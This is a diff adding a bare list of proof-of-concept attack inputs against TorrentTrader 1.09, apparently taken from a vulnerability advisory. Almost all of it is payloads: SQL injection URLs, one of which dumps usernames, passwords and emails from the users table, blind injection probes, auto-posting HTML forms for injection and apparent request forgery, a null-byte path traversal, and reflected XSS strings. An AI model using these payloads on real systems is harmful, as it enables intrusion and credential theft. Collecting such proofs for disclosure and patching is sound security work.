@@ -1,0 +1,63 @@
+http://www.example.com/torrenttrader109/check.php
+
+http://www.example.com/torrenttrader109/account-inbox.php?msg=1&amp;receiver=waraxe&amp;origmsg=foobar&amp;delete=yes
+http://www.example.com/torrenttrader109/browse.php?wherecatin=waraxe
+http://www.example.com/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;1,1,2)=(SELECT+1
+http://www.example.com/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;50,1,2)=(SELECT+1
+http://www.example.com/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;1,(SELECT 1 UNION ALL SELECT 1),2)=(SELECT+1
+http://www.example.com/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;50,(SELECT 1 UNION ALL SELECT 1),2)=(SELECT+1
+http://www.example.com/torrenttrader109/delreq.php?categ=waraxe
+http://www.example.com/torrenttrader109/delreq.php?categ=UNION+ALL+SELECT+1,2,3,4,5,username,password,email+FROM+users--+
+
+-------------------------------------------------------------------------------
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/torrenttrader109/index.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;choice&quot; value=&quot;waraxe&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
+&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+-------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/torrenttrader109/modrules.php?act=edited&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;test&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value=&quot;test&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;public&quot; value=&quot;yes&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;class&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
+&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+-------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/torrenttrader109/report.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;reason&quot; value=&quot;test&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;0 UNION SELECT IF(LENGTH(@@version)&gt;1,(SELECT 1 UNION ALL SELECT 1),1)-- &quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
+&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+-------------------------------------------------------------------------------
+
+-----------------------------[source code start]-------------------------------
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/torrenttrader109/report.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;reason&quot; value=&quot;test&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;0 UNION SELECT IF(LENGTH(@@version)&gt;50,(SELECT 1 UNION ALL SELECT 1),1)-- &quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
+&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+-----------------------------[source code end]---------------------------------
+
+http://www.example.com/torrenttrader109/today.php?limit=waraxe
+http://www.example.com/torrenttrader109/torrents-details.php?id=1&amp;where=1=IF(LENGTH(@@version)&gt;1,1,(SELECT+1+UNION+ALL+SELECT+1))--+
+http://www.example.com/torrenttrader109/torrents-details.php?id=1&amp;where=1=IF(LENGTH(@@version)&gt;50,1,(SELECT+1+UNION+ALL+SELECT+1))--+
+http://www.example.com/torrenttrader109/admin-delreq.php?categ=waraxe
+
+http://www.example.com/torrenttrader109/backend/Admin-functions.php?ss_uri=../../banners.txt%00
+
+http://www.example.com/torrenttrader109/themes/default/footer.php?ttversion=&lt;script&gt;alert(123);&lt;/script&gt;
+http://www.example.com/torrenttrader109/themes/default/header.php?SITENAME=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;
+http://www.example.com/torrenttrader109/themes/default/header.php?CURUSER[username]=&lt;script&gt;alert(123);&lt;/script&gt;
+http://www.example.com/torrenttrader109/visitorstoday.php?todayactive=&lt;script&gt;alert(123);&lt;/script&gt;
+http://www.example.com/torrenttrader109/visitorsnow.php?activepeople=&lt;script&gt;alert(123);&lt;/script&gt;
+http://www.example.com/torrenttrader109/faq.php?faq_categ[999][title]=&lt;script&gt;alert(123);&lt;/script&gt;&amp;faq_categ[999][flag]=1
+http://www.example.com/torrenttrader109/torrents-details.php?id=1&amp;keepget=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;
